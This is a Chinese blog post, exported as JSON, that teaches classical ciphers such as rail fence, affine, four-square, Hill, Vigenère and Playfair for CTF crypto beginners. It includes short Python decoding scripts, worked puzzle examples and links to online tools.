**栅栏密码：**\n\n栅栏密码是典型的置换密码。把明文分成n个1组。在进行连接。根据如何连接，又分为普通栅栏密码（|||栅栏密码）和W型栅栏密码。\n\n\n\n普通栅栏密码（|||栅栏密码）\n\n值和n：\n\nfslda1g2{3a}\n\nn=2\n\n\n\n按2个分组\n\nfs  ld  a1  g2  {3  a}\n\n\n\n取第一个\n\nflag{a\n\n\n\n在取全部\n\nflag{asd123}\n\n普通栅栏密码（|||栅栏密码）真题-one：\n\nBuuctf-Crypto-篱笆墙的影子\n\n直接两栏获得flag\n\n![img](https://pic1.zhimg.com/80/v2-ecb70e84f97468a9c5eed6923bc6a2f0_720w.jpg)\n\nw型栅栏密码\n\n写成W型的栅栏密码。但读取还是按行从左往右读取。\n\n值和n：\n\nflag{asd123}\n\nn=2\n\n\n\n照样是2个分组\n\nf.a.{.s.1.3\n\n.l.g.a.d.2.}\n\n\n\n直接从左往右读取\n\nfa{s13lgad2}\n\n\n\nW型栅栏密码真题-one：\n\n攻防世界Crypto新手-Railfence\n\n根据题目名和题目描述可知是栅栏密码。\n\n\n\n![img](https://pic4.zhimg.com/80/v2-bb5b130d16c4a1530b1a1d0403ee7e8f_720w.jpg)\n\n但不是普通的|||型栅栏密码\n\n是变种的W型栅栏密码\n\n### **在线解密：**\n\n[http://www.atoolbox.net/Tool.php?Id=777](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777)\n\n![img](https://pic3.zhimg.com/80/v2-090a754d2d59387491b0becd12bf1c92_720w.jpg)\n\n手解：\n\n把值按照W型进行横排排列，把明文的第一个填充到密文的第一行第1个位置，把明文的第二个填充到密文的第一行第9个位置。在把明文的第三个填充到密文的第17个位置。在把明文的第四个填充到密文的第25个位置。在把明文的第五个填充到密文的第33个位置。\n\n![img](https://pic1.zhimg.com/80/v2-bdccd3e6610deff7b3399f83385cd15c_720w.jpg)\n\n当len=35，key=5时（这个就自己画一画吧）然后你就会发现：首行和尾行的间隔依旧不变，假设行数为i，当当前数为第2行的奇数的时候，下一个数字为2+6=8也就是（key-i）*2,若当前数为第二行偶数的时候，下一个数字为8+2=10也就是(i-1)*2。\n\n![img](https://pic4.zhimg.com/80/v2-02d6283fe27ea56f8d866bd028d3189f_720w.jpg)\n\n#### 普通栅栏密码加解密：\n\n[https://www.qqxiuzi.cn/bianma/zhalanmima.php](https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/zhalanmima.php)\n\n#### W型栅栏密码在线加解密：\n\n[http://www.atoolbox.net/Tool.php?Id=777](https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D777)\n\n## **云影密码：**\n\n有1，2，4，8这四个数字，可以通过加法来用这四个数字表示0-9中的任何一个数字，列如0=28， 也就是0=2+8，同理7=124，  9=18。这样之后再用1-26来表示26个英文字母，就有了密文与明文之间的对应关系。引入0来作为间隔，以免出现混乱。所以云影密码又叫“01248密码”。\n\n也给出一个python脚本地址：\n\n[https://www.jianshu.com/p/b5aa5cf60f83](https://link.zhihu.com/?target=https%3A//www.jianshu.com/p/b5aa5cf60f83)\n\n```text\n#!/usr/bin/python\n# -*- coding=utf8 -*-\n\"\"\"\n# @Author : pig\n# @CreatedTime:2019-11-2423:54:02\n# @Description : \n\"\"\"\n\n\ndef de_code(c):\n    dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)]\n    flag = []\n    c2 = [i for i in c.split(\"0\")]\n    for i in c2:\n        c3 = 0\n        for j in i:\n            c3 += int(j)\n        flag.append(dic[c3 - 1])\n    return flag\n\ndef encode(plaintext):\n    dic = [chr(i) for i in range(ord(\"A\"), ord(\"Z\") + 1)]\n    m = [i for i in plaintext]\n    tmp = [];flag = []\n    for i in range(len(m)):\n        for j in range(len(dic)):\n            if m[i] == dic[j]:\n                tmp.append(j + 1)\n    for i in tmp:\n        res = \"\"\n        if i >= 8:\n            res += int(i/8)*\"8\"\n        if i%8 >=4:\n            res += int(i%8/4)*\"4\"\n        if i%4 >=2:\n            res += int(i%4/2)*\"2\"\n        if i%2 >= 1:\n            res += int(i%2/1)*\"1\"\n        flag.append(res + \"0\")\n    print (\"\".join(flag)[:-1])\n\nc = input(\"输入要解密的数字串:\")\nprint (de_code(c))\nm_code = input(\"请输入要加密的数字串:\")\nencode(m_code)\n```\n\n\n\n## **简单位移密码：**\n\n这个密码是我在《ctf特训营》这本书上看到的。自己并没有在题目中做到过\n\n实例借鉴书中\n\nm=flag{easy_easy_crypto}\n\nk=”3124”\n\n\n\nlen(k)=4，切分m。\n\nflay {eas y_ea sy_c rypt o}\n\n按照3124直接排列\n\nLafg ea{s _eya y_sc yprt }o\n\n\n\n密文：\n\nLafgea{s_eyay_scyprt}o\n\n\n\n解密代码：\n\n```text\ndef shift_decrypt(c,k):\n    l=len(k)\n    m=\"\"\n    for i in range(0,len(c),l):\n        tmp_m=[\"\"]*l\n        if i+l>=len(c):\n            tmp_c=c[i:]\n            use=[]\n            for kindex in range(len(tmp_c)):\n                use.append(int(k[kindex])-l)\n            use.sort()\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[use.index(int(k[kindex])-l)]\n        else:\n            tmp_c=c[i:i+l]\n            for kindex in range(len(tmp_c)):\n                tmp_m[kindex]=tmp_c[int(k[kindex])-1]\n        m+=\"\".join(tmp_m)\n    return m\nc=\"lafgea{s_eyay_scyprt}o\"\nk=\"3124\"\nprint shift_decrypt(c,k)\n```\n\n\n\n## **曲路密码：**\n\n按照事先约定的原则把明文填入表中\n\n例如：明文为HelloWorldab\n\n\n\n![img](https://pic3.zhimg.com/80/v2-c8e5bd0d1dfa3ececd04d2d2bd49863a_720w.jpg)\n\n\n\n按照一定的顺序进行遍历\n\n密文就是lrbaoleWdloH\n\n\n\n**CTF crypto线下工具推荐：**\n\n\n\n**CTFCrackTools**\n\n[https://github.com/Acmesec/CTFCrackTools](https://link.zhihu.com/?target=https%3A//github.com/Acmesec/CTFCrackTools)\n\n![img](https://pic4.zhimg.com/80/v2-1131910e2546d1455cf91261f8369e73_720w.jpg)\n\n**CyberChef**\n\n[https://www.chinabaiker.com/cyberchef.htm](https://link.zhihu.com/?target=https%3A//www.chinabaiker.com/cyberchef.htm)\n\n直接可以下载到本地\n\n![img](https://pic1.zhimg.com/80/v2-aa7579316f632a3a6351bb73f1bf9840_720w.jpg)\n\n\n\n**参考：**\n\n[https://ctf-wiki.github.io/ctf-wiki/crypto](https://link.zhihu.com/?target=https%3A//ctf-wiki.github.io/ctf-wiki/crypto)\n\n[https://zh.wikipedia.org/wiki](https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki)\n\n[https://baike.baidu.com](https://link.zhihu.com/?target=https%3A//baike.baidu.com)\n\n《ctf特训营》\n\n[https://buuoj.cn/](https://link.zhihu.com/?target=https%3A//buuoj.cn/)\n\n**相关实验：**\n\n相关实验：密码学原理\n\n[课程:密码学原理(合天网安实验室)](https://link.zhihu.com/?target=https%3A//sourl.cn/9cMsyV)\n\n（密码学是研究如何隐密地传递信息的学科。通过本课程实验掌握密码学的相关知识。）","slug":"2020-10-01-古典密码从零到一","published":1,"updated":"2020-10-03T12:57:14.949Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckkntx9jj000lxov7ckxb9c82","content":"<p>[toc]</p>\n<h1 id=\"古典密码从0到1\"><a href=\"#古典密码从0到1\" class=\"headerlink\" title=\"古典密码从0到1\"></a>古典密码从0到1</h1><p><strong><img src=\"https://pic1.zhimg.com/80/v2-f483400333b7ccaa8689e9cfc0c3e8dc_720w.jpg\" alt=\"img\"></strong></p>\n<h2 id=\"古典密码和现代密码的区别：\"><a href=\"#古典密码和现代密码的区别：\" class=\"headerlink\" title=\"古典密码和现代密码的区别：\"></a><strong>古典密码和现代密码的区别：</strong></h2><p>古典密码是密码学中的其中一个类型，其大部分加密方式都是利用替换式密码或移项式密码，有时则是两者的混合。其于历史中经常使用，但现代已经很少使用，大部分的已经不再使用了。一般而言，经典密码是基于一个拼音字母（像是 A-Z）、动手操作或是简单的设备。它们可能是一种简单的密码法，以致于不可信赖的地步，特别是有新技术被发展出来后。</p>\n<p>现代的方法是用电脑或是其它数字科技，基于比特和字节上操作。许多经典密码被受尊重的人使用，像是尤利乌斯·凯撒和拿破仑，他们创造了一些常被人们使用的密码。许多密码起源于军事上，相同立场的人常使用来寄送秘密消息。经典的方法常攻击密码文，有时候甚至不知其密码系统，也可以使用工具，像是频率分析法。有些经典密码是使用先进的机器或是机电密码机器，像是恩尼格玛密码机。                           —维基</p>\n<p>其中，古典密码学，作为一种实用性艺术存在，其编码和破译通常依赖于设计者和敌手的创造力与技巧，并没有对密码学原件进行清晰的定义。古典密码学主要包含以下几个方面：</p>\n<p>单表替换加密（Monoalphabetic Cipher）</p>\n<p>多表替换加密（Polyalphabetic Cipher）</p>\n<p>奇奇怪怪的加密方式                                             –ctf wiki</p>\n<h2 id=\"凯撒密码：\"><a href=\"#凯撒密码：\" class=\"headerlink\" title=\"凯撒密码：\"></a><strong>凯撒密码：</strong></h2><p>​    凯撒曾经使用这种密码与其将军们来联系，所以用凯撒来命名这种密码。</p>\n<p>根据图片来了解加密原理。凯撒密码一般适用于26个英文字母。根据偏移量来进行加密。如图所示，当偏移量=3。即是A-D,B-E。</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-ab311b6e604849f12c19e5e96818a925_720w.jpg\" alt=\"img\"></p>\n<p>​    把字母转成数学，数学公式如下。</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-f77f29985ee9014f3df11575682ac180_720w.jpg\" alt=\"img\"></p>\n<h3 id=\"在线加解密网站：\"><a href=\"#在线加解密网站：\" class=\"headerlink\" title=\"在线加解密网站：\"></a><strong>在线加解密网站：</strong></h3><p><a href=\"https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/kaisamima.php\" target=\"_blank\" rel=\"noopener\">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//www.metools.info/code/c70.html\" target=\"_blank\" rel=\"noopener\">http://www.metools.info/code/c70.html</a></p>\n<p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D778\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=778</a></p>\n<h2 id=\"仿射密码：\"><a href=\"#仿射密码：\" class=\"headerlink\" title=\"仿射密码：\"></a><strong>仿射密码：</strong></h2><p>数学加密公式：</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-1a7aeab7e90203fc056e398344ce2b7a_720w.jpg\" alt=\"img\"></p>\n<p>仿射密码中解密需要用到求逆元</p>\n<p>直接给出python解密脚本：</p>\n<pre class=\"line-numbers language-text\"><code class=\"language-text\">import primefac\ndef affine_decode(c,a,b,origin=\"abcdefghijklmnopqrstuvwxyz\"):\n    r=\"\"\n    n=len(origin)\n    ai=primefac.modinv(a,n)%n\n    for i in c:\n        if origin.find(i)!=1:\n            r+=origin[(ai*(origin.index(i)-b))%n]\n        else:\n            r+=i\n    return r\nprint affine_decode(\"ihhwvcswfrcp\",5,8)\n\ndef affine_guessab(m1,c1,m2,c2,origin=\"abcdefghijklmnopqrstuvwxyz\"):\n    x1=origin.index(m1)\n    x2=origin.index(m2)\n    y1=origin.index(c1)\n    y2=origin.index(c2)\n    n=len(origin)\n    dxi=primefac.modinv(x1-x2,n)%n\n    a=dxi*(y1-y2) % n\n    b=(y1-a*x1)%n\n    return a,b\nprint affine_guessab(\"a\",\"i\",\"f\",\"h\")<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"仿射密码在线加解密网站：\"><a href=\"#仿射密码在线加解密网站：\" class=\"headerlink\" title=\"仿射密码在线加解密网站：\"></a>仿射密码在线加解密网站：</h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D911\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=911</a></p>\n<h5 id=\"仿射密码真题-one：\"><a href=\"#仿射密码真题-one：\" class=\"headerlink\" title=\"仿射密码真题-one：\"></a>仿射密码真题-one：</h5><p>Buuctf- Crypto-[GKCTF2020]小学生的密码学</p>\n<p>e(x)=11x+6(mod26)</p>\n<p>密文：welcylk</p>\n<p>（flag为base64形式）</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-cf93192b800a57815bc7b5c050f8c673_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-b9d84b6e31edf9ebe9931c5174eba819_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"四方密码：\"><a href=\"#四方密码：\" class=\"headerlink\" title=\"四方密码：\"></a><strong>四方密码：</strong></h2><p>四方密码是一种对称式加密法，由法国人Felix Delastelle（1840年–1902年）发明。</p>\n<p>这种方法将字母两个一组，然后采用多字母替换密码。</p>\n<p>四方密码用4个5×5的矩阵来加密。每个矩阵都有25个字母（通常会取消Q或将I,J视作同一样，或改进为6×6的矩阵，加入10个数字）。</p>\n<p>选两个密钥，example和keyword。去掉重复的字母。就是example变成exampl。余下的字母顺序存入矩阵即可</p>\n<p>加密矩阵放右上和左下。</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-7f9734b21e0caee6689d77d9de7e1b6c_720w.jpg\" alt=\"img\"></p>\n<p>加密步骤。把字符串按两个字母一组分开</p>\n<p>Helloworld</p>\n<p>He ll ow or ld</p>\n<p>找第一组第一个字母在左上角矩阵的位置：</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-c210fedc80540995f608f795a073acda_720w.jpg\" alt=\"img\"></p>\n<p>找第一组第二个字母在右下角矩阵的位置：</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-165d0ff7602b3b7801cd2e050cc948e0_720w.jpg\" alt=\"img\"></p>\n<p>先找和一个字母同横的，和第二个字母同直的</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-9df900be2dee2b0602d420ff290a5adc_720w.jpg\" alt=\"img\"></p>\n<p>第一个字母同直，第二个字母同横的</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-01dc7c7890019f58beef4ade3bd5eab7_720w.jpg\" alt=\"img\"></p>\n<p>得到he加密后为FY</p>\n<p>如此可得接下来，最后就是</p>\n<p>he lp me ob iw an ke no bi</p>\n<p>FY GM KY HO BX MF KK KI MD</p>\n<h5 id=\"四方密码真题-one：\"><a href=\"#四方密码真题-one：\" class=\"headerlink\" title=\"四方密码真题-one：\"></a>四方密码真题-one：</h5><p>Buuctf-crypo-四面八方</p>\n<p>四方密码：</p>\n<p>wiki上了解四方密码如何加解密的一个过程</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC\" target=\"_blank\" rel=\"noopener\">https://zh.wikipedia.org/wiki/%E5%9B%9B%E6%96%B9%E5%AF%86%E7%A2%BC</a></p>\n<p>密钥存阵</p>\n<p>通常在题目中会给定2个密钥，我们要去掉Q或者把I和J当成一个。按照26个英文字母。秘钥中出现的不填。补充成5*5的矩阵</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-bf5760187447c0cdd17602207d2b8453_720w.jpg\" alt=\"img\"></p>\n<p>这题直接填充即可</p>\n<p>securityabdfghjklmnopvwxz</p>\n<p>securityadbfghjklmnopvwxz</p>\n<p>abcdefghijklmnopqrstuvwxyz</p>\n<p>informatn</p>\n<p>informatbcdeghjklpsuvwxyz</p>\n<p>abcdefghijklmnopqrstuvwxyz</p>\n<h3 id=\"在线解密工具：\"><a href=\"#在线解密工具：\" class=\"headerlink\" title=\"在线解密工具：\"></a><strong>在线解密工具：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html\" target=\"_blank\" rel=\"noopener\">http://ctf.ssleye.com/four.html</a></p>\n<p>根据题目说的解出来的语句是个通顺的句子，那肯定排序就有点问题</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-6dfcefe68d59545916e53be11cfebb3c_720w.jpg\" alt=\"img\"></p>\n<p><strong>接下来可以拿出词频分析。</strong></p>\n<p>这边分割可以多试试。可以看出来个success，其他位置试</p>\n<p><strong><a href=\"https://link.zhihu.com/?target=https%3A//quipqiup.com/\" target=\"_blank\" rel=\"noopener\">https://quipqiup.com/</a></strong></p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-8a82b177919a7e61bcc1d84ff940acb2_720w.jpg\" alt=\"img\"></p>\n<h3 id=\"四方密码在线加解密网站：\"><a href=\"#四方密码在线加解密网站：\" class=\"headerlink\" title=\"四方密码在线加解密网站：\"></a>四方密码在线加解密网站：</h3><p><a href=\"https://link.zhihu.com/?target=http%3A//ctf.ssleye.com/four.html\" target=\"_blank\" rel=\"noopener\">http://ctf.ssleye.com/four.html</a></p>\n<h2 id=\"培根密码：\"><a href=\"#培根密码：\" class=\"headerlink\" title=\"培根密码：\"></a><strong>培根密码：</strong></h2><p>培根密码直接根据表中的字母进行转换。</p>\n<p>密文一般只含有a和b字母</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-9e23a167e68739049ecb21cdde085a98_720w.jpg\" alt=\"img\"></p>\n<p>培根密码在线解密：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//tool.bugku.com/peigen/\" target=\"_blank\" rel=\"noopener\">https://tool.bugku.com/peigen/</a></p>\n<p>培根密码真题-one：</p>\n<p>攻防世界crypto新手-不仅仅是morse</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-bc8cc8808aa0560f4811c4e0c2283a3f_720w.jpg\" alt=\"img\"></p>\n<p>把/转换成空格。直接拿出morse解密</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-7712dc9ce03f0cbad6f2e3cf68b19062_720w.jpg\" alt=\"img\"></p>\n<p>在看后面一段像培根密码，根据题目提示是食物加密。</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-8f60398906141bf4062ade9faa45787d_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"标准银河字母：\"><a href=\"#标准银河字母：\" class=\"headerlink\" title=\"标准银河字母：\"></a><strong>标准银河字母：</strong></h2><p>标准银河字母（Standard Galactic Alphabet）出自游戏《指挥官基恩》系列。是系列中使用的书写系统。这是一个简单的替代暗号，用不同的符号取代拉丁字母。SGA可以在不同的语言中使用，比如在游戏《Minecraft》，《指挥官基恩》中。</p>\n<p>如果遇到这类题。直接根据题目来进行图翻-&gt;字母</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-ba0f6c12d8d4c71bc1f36c0faa472272_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"圣堂武士密码：\"><a href=\"#圣堂武士密码：\" class=\"headerlink\" title=\"圣堂武士密码：\"></a><strong>圣堂武士密码：</strong></h2><p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种,一直被共济会圣殿骑士用。</p>\n<p>直接根据图片上的直接翻译出字母即可</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-1fbce927928b8189a662418fa9655394_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"猪圈密码：\"><a href=\"#猪圈密码：\" class=\"headerlink\" title=\"猪圈密码：\"></a><strong>猪圈密码：</strong></h2><p>猪圈密码（亦称朱高密码、共济会暗号、共济会密码或共济会员密码），是一种以格子为基础的简单替代式密码。即使使用符号，也不会影响密码分析，亦可用在其它替代式的方法。</p>\n<p>直接图片替换字母即可</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-c20685d002fe2653944302a1c12a5327_720w.jpg\" alt=\"img\"></p>\n<h3 id=\"猪圈密码在线解密网站：\"><a href=\"#猪圈密码在线解密网站：\" class=\"headerlink\" title=\"猪圈密码在线解密网站：\"></a><strong>猪圈密码在线解密网站：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.metools.info/code/c90.html\" target=\"_blank\" rel=\"noopener\">http://www.metools.info/code/c90.html</a></p>\n<p>猪圈密码真题：</p>\n<p>Buuctf-crypto-萌萌哒的八戒</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-64cefda059f2f55f522ad0ca6e81f74f_720w.jpg\" alt=\"img\"></p>\n<p>直接解密</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-87186735e3b7ee8e57ca015e5cecddd3_720w.jpg\" alt=\"img\"></p>\n<p>猪圈密码-圣堂武士密码-标准银河字母-栅栏密码真题：</p>\n<p>Buuctf-Crypto- [MRCTF2020]古典密码知多少</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-52004a0174178967f87f54236b8d01bf_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-1b31253a3056562005cb5f6ac911ed30_720w.jpg\" alt=\"img\"></p>\n<p>图上的蓝色就是猪圈密码，橙色的是圣堂武士密码，黑色的是银河字母。</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-61739e1b2e5a4eed51c7bf7abb7a3f26_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-c7a82d3ea6d815257627ee9273676061_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"当铺密码：\"><a href=\"#当铺密码：\" class=\"headerlink\" title=\"当铺密码：\"></a><strong>当铺密码：</strong></h2><p>当铺密码就是一种将中文和数字进行转化的密码，算法相当简单:当前汉字有多少笔画出头，就是转化成数字几。例如：</p>\n<p>口 0    田 0    由 1    中 2    人 3    工 4</p>\n<p>大 5    王 6    夫 7    井 8    羊 9</p>\n<p>具体映射可查看：</p>\n<p><a href=\"https://link.zhihu.com/?target=https%3A//www.cnblogs.com/cc11001100/p/9357263.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/cc11001100/p/9357263.html</a></p>\n<p>当铺密码真题：</p>\n<p>Buuctf-crypto-GKCTF2020汉字的秘密</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-9abe603c0eef1e0746f91ec04dc24aad_720w.jpg\" alt=\"img\"></p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-fb9478ec0839e5017f8cd83cef8bfbb7_720w.jpg\" alt=\"img\"></p>\n<p>直接解码发现不对。</p>\n<p><img src=\"https://pic4.zhimg.com/80/v2-65054bc4d94d218e47c6b7229e799357_720w.jpg\" alt=\"img\"></p>\n<p>翻看ascii码。改进一下脚本：</p>\n<p>自己猜一下flag开头为flag。可以看到ascii嘛每一位都是递增的。</p>\n<p>差为1,2,3,4</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-f2ccb7e18e9b325dc067e5d977740536_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"跳舞的小人密码：\"><a href=\"#跳舞的小人密码：\" class=\"headerlink\" title=\"跳舞的小人密码：\"></a><strong>跳舞的小人密码：</strong></h2><p>跳舞的人，讲的是一个黑帮发明的一种密码，其密码就是用一个一个的跳舞的小人组成的，一个小人是一个字母。有人用这种密码进行通信，来威胁某人，福尔摩斯后来破解了这个密码，抓住了坏人。</p>\n<p>这题直接根据表来进行转换即可。加解密同</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-bfa0f0835ce4a7ec0dae25be5c3d40a4_720w.jpg\" alt=\"img\"></p>\n<p>这题感觉是做过的。但没翻到例题。就不放了。</p>\n<h2 id=\"希尔密码（hill）：\"><a href=\"#希尔密码（hill）：\" class=\"headerlink\" title=\"希尔密码（hill）：\"></a><strong>希尔密码（hill）：</strong></h2><p>希尔密码（Hill Cipher）是运用基本矩阵论原理的替换密码，由Lester S. Hill在1929年发明。每个字母当作26进制数字：A=0, B=1, C=2… 一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。</p>\n<p>直接给出网上的脚本可以参考：</p>\n<pre class=\"line-numbers language-text\"><code class=\"language-text\">import numpy as np\n\nm = 'YOURPINNOISFOURONETWOSIX'  #明文\na = np.matrix([[11,2,19],[5,23,25],[20,7,17]])  #密钥LCTFXZUHR\nnum_m = []\ntemp = []\ncount = 1\nfor i in m:  #将明文分为三个一组\n    temp.append(ord(i)-ord('A'))\n    if count % 3 == 0:\n        num_m.append(temp)\n        temp = []\n    count += 1\nmat_m = [np.matrix(i).T for i in num_m]  #将明文分组转换为向量形式\nmat_c = [a * i % 26 for i in mat_m]  #得到密文分组的向量形式\nnum_c = []\ntemp = []\nfor i in mat_c:  #将密文向量转换为列表形式，且合并到一个列表\n    temp = i.tolist()\n    for j in range(3):\n        num_c.append(temp[j][0])\nc = [chr(i+ord('A')) for i in num_c]\nprint(''.join(c))  #连接成字符串,输出密文<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"希尔密码在线加解密：\"><a href=\"#希尔密码在线加解密：\" class=\"headerlink\" title=\"希尔密码在线加解密：\"></a><strong>希尔密码在线加解密：</strong></h3><p><a href=\"https://link.zhihu.com/?target=http%3A//www.atoolbox.net/Tool.php%3FId%3D914\" target=\"_blank\" rel=\"noopener\">http://www.atoolbox.net/Tool.php?Id=914</a></p>\n<h2 id=\"维吉尼亚密码：\"><a href=\"#维吉尼亚密码：\" class=\"headerlink\" title=\"维吉尼亚密码：\"></a><strong>维吉尼亚密码：</strong></h2><p>维吉尼亚密码（又译维热纳尔密码）是使用一系列凯撒密码组成密码字母表的加密算法，属于多表密码的一种简单形式。</p>\n<p>维吉尼亚加解密表格：</p>\n<p><img src=\"https://pic2.zhimg.com/80/v2-0256b1f8fe704260074c03e4b2696ef5_720w.jpg\" alt=\"img\"></p>\n<p>当明文为</p>\n<p>ATTACKATDAWN</p>\n<p>选择某一关键词并重复而得到密钥，如关键词为LEMON时，密钥为：</p>\n<p>LEMONLEMONLE</p>\n<p>对于明文的第一个字母A，对应密钥的第一个字母L，于是使用表格中L行字母表进行加密，得到密文第一个字母L。类似地，明文第二个字母为T，在表格中使用对应的E行进行加密，得到密文第二个字母X。以此类推，可以得到：</p>\n<p>明文：ATTACKATDAWN</p>\n<p>密钥：LEMONLEMONLE</p>\n<p>密文：LXFOPVEFRNHR</p>\n<h3 id=\"维吉尼亚密码在线加解密：\"><a href=\"#维吉尼亚密码在线加解密：\" class=\"headerlink\" title=\"维吉尼亚密码在线加解密：\"></a><strong>维吉尼亚密码在线加解密：</strong></h3><p><a href=\"https://link.zhihu.com/?target=https%3A//www.qqxiuzi.cn/bianma/weijiniyamima.php\" target=\"_blank\" rel=\"noopener\">https://www.qqxiuzi.cn/bianma/weijiniyamima.php</a></p>\n<p>维吉尼亚密码真题-one：</p>\n<p>BUUCTF-Crypto-[BJDCTF 2nd]燕言燕语-y1ng</p>\n<p>小燕子，穿花衣，年年春天来这里，我问燕子你为啥来，燕子说:</p>\n<p>79616E7A69205A4A517B78696C7A765F6971737375686F635F73757A6A677D20</p>\n<p>16进制转字符串</p>\n<p><img src=\"https://pic1.zhimg.com/80/v2-8a3764498e3bbb3b136a4ff59ac70ba0_720w.jpg\" alt=\"img\"></p>\n<p>维吉尼亚在线直接解</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-2aa851be441a5f864a0b1306eac29392_720w.jpg\" alt=\"img\"></p>\n<h2 id=\"棋盘密码（Polybius）：\"><a href=\"#棋盘密码（Polybius）：\" class=\"headerlink\" title=\"棋盘密码（Polybius）：\"></a><strong>棋盘密码（Polybius）：</strong></h2><p>波利比奥斯棋盘（Polybius Checkerboard）是棋盘密码的一种，是利用波利比奥斯方阵(Polybius  Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。</p>\n<p>借鉴知乎上的图</p>\n<p><img src=\"https://pic3.zhimg.com/80/v2-095ef336986fd39db6580115c3a78792_720w.jpg\" alt=\"img\"></p>\n<p>先看纵向，在看横向。得到密文</p>\n<p>明文HELLO 密文：23 15 31 31 34</p>\n<h2 id=\"普莱费尔密码（playfair）：\"><a href=\"#普莱费尔密码（playfair）：\" class=\"headerlink\" title=\"普莱费尔密码（playfair）：\"></a><strong>普莱费尔密码（playfair）：</strong></h2><p>选取一个英文字作密钥。除去重复出现的字母。将密钥的字母逐个逐个加入5×5的矩阵内，剩下的空间将未加入的英文字母依a-z的顺序加入。（将Q去除，或将I和J视作同一字。）</p>\n<p>将要加密的讯息分成两个一组。若组内的字母相同，将X（或Q）插入两字母之间，重新分组（例如 HELLO 将分成 HE LX LO）。若剩下一个字，也加入X字。</p>\n<p>在每组中，找出两个字母在矩阵中的地方。</p>\n<p>若两个字母不在同一直行或同一横列，在矩阵中找出另外两个字母，使这四个字母成为一个长方形的四个角。</p>\n<p>若两个字母在同一横列，取这两个字母右方的字母（若字母在最右方则取最左方的字母）。</p>\n<p>若两个字母在同一直行，取这两个字母下方的字母（若字母在最下方则取最上方的字母）。</p>\n<p>取playfair example为密钥。即可得到表</p>\n<p>P L A Y F</p>\n<p>I R E X M</p>\n<p>B C D G H</p>\n<p>K N O Q S</p>\n<p>T U V W Z</p>\n<p>需要加密的为Hide the gold</p>\n<p>HI DE TH EG OL</p>\n<p>加密后为</p>\n<p>BM OD ZB XD</p>\n<h3 id=\"在线普莱费尔加解密：\"><a href=\"#在线普莱费尔加解密：\" class=\"headerlink\" title=\"在线普莱费尔加解密：\"></a><strong>在线普莱费尔加解密：</strong></h3><p><a 